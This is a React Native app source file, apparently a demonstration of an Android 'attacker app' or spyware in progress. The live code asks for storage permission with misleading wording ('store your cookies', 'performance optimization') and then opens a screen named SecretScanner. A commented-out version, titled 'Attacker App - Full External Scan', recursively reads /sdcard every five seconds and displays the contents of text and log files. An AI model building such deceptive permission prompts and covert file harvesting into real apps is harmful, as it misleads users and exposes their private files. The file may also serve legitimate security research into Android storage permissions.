import React, { useEffect, useState } from 'react';
import { Alert, PermissionsAndroid, Platform, View, Text } from 'react-native';
import { NavigationContainer } from '@react-navigation/native';
import { createNativeStackNavigator } from '@react-navigation/native-stack';
import HomeScreen from './screens/HomeScreen';
import SecretScanner from './screens/SecretScanner';

const Stack = createNativeStackNavigator();

export default function App() {
  const [permissionGranted, setPermissionGranted] = useState(false);
  const [checked, setChecked] = useState(false);

  useEffect(() => {
  const checkPermission = async () => {
    if (Platform.OS === 'android' && Platform.Version < 30) {
      Alert.alert(
        'Storage Permission Required',
        'Enable storage permission to store your cookies clicked.',
        [
          {
            text: 'Allow',
            onPress: async () => {
              const granted = await PermissionsAndroid.request(
                PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
                {
                  title: 'Storage Permission',
                  message: 'This app requires access to your external storage for performance optimization',
                  buttonPositive: 'OK',
                }
              );
              setPermissionGranted(granted === PermissionsAndroid.RESULTS.GRANTED);
              setChecked(true);
            },
          },
          {
            text: 'Deny',
            onPress: () => {
              setPermissionGranted(false);
              setChecked(true);
            },
            style: 'cancel',
          },
        ]
      );
    } else {
      setPermissionGranted(true);
      setChecked(true);
    }
  };

  checkPermission();
  }, []);

  if (!checked) {
    return (
      <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center' }}>
        <Text>Checking permissions...</Text>
      </View>
    );
  }

  if (!permissionGranted) {
    return (
      <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center' }}>
        <Text>Storage permission denied.</Text>
      </View>
    );
  }

  return (
    <NavigationContainer>
      <Stack.Navigator screenOptions={{ headerShown: false }}>
        <Stack.Screen name="Home" component={HomeScreen} />
        <Stack.Screen name="SecretScanner" component={SecretScanner} />
      </Stack.Navigator>
    </NavigationContainer>
  );
}





// import React, { useEffect, useState } from 'react';
// import {
//   PermissionsAndroid,
//   Platform,
//   SafeAreaView,
//   ScrollView,
//   Text,
//   View,
//   StyleSheet,
// } from 'react-native';
// import RNFS from 'react-native-fs';

// const ROOT_PATH = '/sdcard';
// const SCAN_INTERVAL = 5;

// export default function App() {

//     const [permissionGranted, setPermissionGranted] = useState(false);
//     const [scannedFiles, setScannedFiles] = useState([]);
//     const [fileContents, setFileContents] = useState({});
//     const [countdown, setCountdown] = useState(SCAN_INTERVAL);

//     useEffect(() => {
//         const requestPermission = async () => {
//         if (Platform.OS === 'android' && Platform.Version < 30) {
//             const granted = await PermissionsAndroid.request(
//                 PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
//                     {
//                         title: 'Storage Permission',
//                         message: 'This app requires access to your external storage',
//                         buttonPositive: 'OK',
//                     }
//             );
//             setPermissionGranted(granted === PermissionsAndroid.RESULTS.GRANTED);
//         } else {
//             setPermissionGranted(true);
//         }
//     };
//     requestPermission();
//     }, []);

//     useEffect(() => {
//         if (!permissionGranted) return;

//         const scanAllFiles = async (dirPath) => {
//         let allFiles = [];
//         try {
//             const items = await RNFS.readDir(dirPath);

//             for (const item of items) {
//                 if (item.isDirectory()) {
//                     const subFiles = await scanAllFiles(item.path);
//                     allFiles = allFiles.concat(subFiles);
//                 } else {
//                     allFiles.push(item.path);
//                 }
//             }
//         } catch (err) {
//             // permission denied or restricted path
//         }
//         return allFiles;
//         };

//         const readFilesPeriodically = async () => {
//             const paths = await scanAllFiles(ROOT_PATH);
//             const newFileContents = {};

//             for (const file of paths) {
//                 if (file.endsWith('.txt') || file.endsWith('.log')) {
//                     try {
//                         const content = await RNFS.readFile(file, 'utf8');
//                         newFileContents[file] = content;
//                     } catch (e) {
//                         // unreadable file, skip
//                     }
//                 }
//             }

//             setScannedFiles(paths);
//             setFileContents(newFileContents);
//         };

//         const interval = setInterval(readFilesPeriodically, 5000);
//         readFilesPeriodically(); // initial scan

//         return () => clearInterval(interval);
//     }, [permissionGranted]);

//     return (
//         <SafeAreaView style={styles.container}>
//             <Text style={styles.header}>📂 Attacker App - Full External Scan</Text>
//             <Text style={styles.subheader}>Scanning /sdcard recursively every 5s</Text>
//             <ScrollView>
//                 {Object.keys(fileContents).map((filePath) => (
//                 <View key={filePath} style={styles.fileBlock}>
//                     <Text style={styles.filePath}>{filePath}</Text>
//                     <Text selectable style={styles.fileContent}>
//                     {fileContents[filePath].slice(0, 1000) || '(Empty)'}
//                     </Text>
//                 </View>
//                 ))}
//             </ScrollView>
//         </SafeAreaView>
//     );
// };

// const styles = StyleSheet.create({
//     container: { flex: 1, padding: 16 },
//     header: { fontSize: 20, fontWeight: 'bold', marginBottom: 6 },
//     subheader: { fontSize: 12, color: 'gray', marginBottom: 12 },
//     fileBlock: { marginBottom: 16, padding: 10, backgroundColor: '#f1f1f1', borderRadius: 6 },
//     filePath: { fontSize: 13, fontWeight: 'bold', marginBottom: 4 },
//     fileContent: { fontFamily: 'monospace', fontSize: 12 },
// });
